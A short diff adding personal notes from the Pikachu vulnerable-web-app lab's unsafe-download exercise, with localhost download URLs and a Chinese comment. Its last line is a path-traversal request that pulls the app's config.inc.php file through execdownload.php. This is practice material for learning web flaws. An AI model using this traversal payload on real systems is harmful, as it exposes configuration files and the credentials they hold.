@@ -1,0 +1,10 @@
+http://127.0.0.1/pikachu-master/vul/unsafedownload/download/ns.png
+http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=ns.png
+
+http://127.0.0.1/pikachu-master/vul/unsafedownload/download/ai.png
+http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=ai.png
+
+如果下载config.inc.php
+pikachu-master/inc/config.inc.php
+
+http://127.0.0.1/pikachu-master/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php
